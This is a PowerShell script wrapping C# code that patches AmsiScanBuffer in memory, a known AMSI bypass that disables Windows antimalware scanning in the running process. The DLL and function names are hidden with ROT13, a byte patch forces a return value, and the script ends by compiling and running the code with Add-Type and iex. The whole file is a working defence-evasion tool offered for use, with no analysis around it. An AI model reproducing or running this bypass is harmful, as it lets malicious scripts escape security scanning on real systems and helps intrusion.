$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace amsi_bypazz {
    public class Program {
        //static byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
        static byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; //x86
        static IntPtr addr = GetFunctionAddr(Transform("nzfv.qyy"), Transform("NzfvFpnaOhssre"));


        public static void Main(string[] args) { // thanks: https://rastamouse.me/memory-patching-amsi-bypass/
            uint oldProtect = 0;
            VirtualProtect(addr, (IntPtr)patch.Length, 0x40, ref oldProtect);
            Marshal.Copy(patch, 0, (IntPtr)addr, patch.Length);

        }

        static IntPtr GetFunctionAddr(string module, string function) { // function name is case sensitive

            LoadLibrary(module);

            var modules = Process.GetCurrentProcess().Modules;
            var hMod = IntPtr.Zero;

            // loop over all the loaded modules, looking for the target module
            foreach (ProcessModule pModule in modules) {
                if (pModule.ModuleName.ToLower().Equals(module.ToLower())) {

                    hMod = pModule.BaseAddress;

                    break;
                }
            }


            var FunctionAddr = GetProcAddress(hMod, function);


            return FunctionAddr;

        }

        // https://www.dotnetperls.com/rot13
        public static string Transform(string value) {
            char[] array = value.ToCharArray();
            for (int i = 0; i < array.Length; i++) {
                int number = (int)array[i];

                if (number >= 'a' && number <= 'z') {
                    if (number > 'm') {
                        number -= 13;
                    }
                    else {
                        number += 13;
                    }
                }
                else if (number >= 'A' && number <= 'Z') {
                    if (number > 'M') {
                        number -= 13;
                    }
                    else {
                        number += 13;
                    }
                }
                array[i] = (char)number;
            }
            return new string(array);
        }


        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, ref uint uint_1);
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp	
iex "[amsi_bypazz.Program]::Main('')"
